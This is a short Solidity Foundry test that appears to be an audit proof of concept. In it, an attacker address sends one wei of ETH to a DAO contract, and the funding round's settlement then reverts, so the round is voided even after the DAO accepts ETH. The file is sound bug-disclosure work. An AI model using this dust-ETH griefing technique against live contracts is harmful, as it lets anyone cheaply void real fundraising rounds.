// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;
import {FundingTermsTest} from "./FundingTerms.t.sol";
import {FundingTerms} from "../src/FundingTerms.sol";

contract OneWeiEthPoc is FundingTermsTest {
    function test_poc_one_wei_eth_voids_even_after_accept() public {
        uint256 id = _selling(40e18, uint128(USD));
        _bid(id, BEN, 40e18, 10);
        address mallory = address(0xBAD);
        vm.deal(mallory, 1);
        vm.prank(mallory);
        (bool ok,) = address(dao).call{value: 1}("");
        assertTrue(ok);
        address[] memory eth = new address[](1);
        vm.prank(address(dao));
        terms.accept(eth, true);
        vm.warp(_closesAt(id));
        (uint256 step,,) = rounds.clearingStep(id);
        vm.expectRevert(abi.encodeWithSelector(FundingTerms.OtherAssets.selector, address(0)));
        rounds.settle(id, step);
        vm.warp(_closesAt(id) + rounds.SETTLE_WINDOW() + 1);
        assertTrue(rounds.isVoid(id));
    }
}
